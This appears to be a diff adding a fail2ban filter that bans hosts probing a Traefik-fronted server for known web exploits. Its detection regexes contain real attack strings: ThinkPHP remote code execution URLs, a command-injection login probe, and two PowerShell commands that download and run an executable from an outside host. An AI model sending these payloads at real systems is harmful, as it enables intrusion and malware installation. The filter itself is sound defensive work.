@@ -1,0 +1,18 @@
+# /etc/fail2ban/filter.d/traefik-botsearch.conf
+[INCLUDES]
+before = botsearch-common.conf
+
+[Definition]
+
+exploit = vendor/phpunit/phpunit/src/Util/PHP/eval-stdin\.php|index\.php\?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars\[0\]=md5&vars\[1\]\[\]=HelloThinkPHP|\?XDEBUG_SESSION_START=phpstorm|api/jsonws/invoke|\?a=fetch&content=<php>die\(@md5\(HelloThinkCMF\)\)</php>
+admin-try=solr/admin/info/system\?wt=json|.*index\.php/admin/|boaform/admin/formLogin|adv,/cgi-bin/weblogin\.cgi\?username=admin%%27%%3Bls%%20%%23&password=asdf
+mail=owa/auth/logon\.aspx.*|MAPI/API
+misc1=.*rss/order/new|.*errors/503\.php|.*rss/catalog/notifystock|.*downloader/index\.php|.*rss/catalog/review|.*public/index\.php
+misc2=elrekt\.php|azenv\.php|GponForm/diag_Form\?style/|echo\.php|portal/redlion|.*y000000000000\.cfg|cgi-bin/mainfunction\.cgi
+misc3=dns-query.*|.*rm\+-rf\+.*|\.git.*|GoPro5/black/2018/
+misc4=/public/index\.php\?s=index/think\\app/invokefunction&function=call_user_func_array&vars\[0\]=system&vars\[1\]\[\]=cmd\.exe%%20/c%%20powershell%%20\(new-object%%20System\.Net\.WebClient\)\.DownloadFile\('http://fid\.hognoob\.se/download\.exe','%%SystemRoot%%/Temp/lxeuxzjknqzilbr31034\.exe'\);start%%20%%SystemRoot%%/Temp/lxeuxzjknqzilbr31034\.exe
+misc5=/public/hydra\.php\?xcmd=cmd\.exe%%20/c%%20powershell%%20\(new-object%%20System\.Net\.WebClient\)\.DownloadFile\('http://fid\.hognoob\.se/download\.exe','%%SystemRoot%%/Temp/lxeuxzjknqzilbr31034\.exe'\);start%%20%%SystemRoot%%/Temp/lxeuxzjknqzilbr31034\.exe
+
+block = \/?(<webmail>|<phpmyadmin>|<wordpress>|<exploit>|<admin-try>|<mail>|<misc1>|<misc2>|<misc3>|<misc4>|<misc5>|cgi-bin|mysqladmin)[^,]*
+
+failregex = ^<HOST> \- \- \[\] \"(GET|POST|HEAD) \/<block> \S+\" 404 .+$
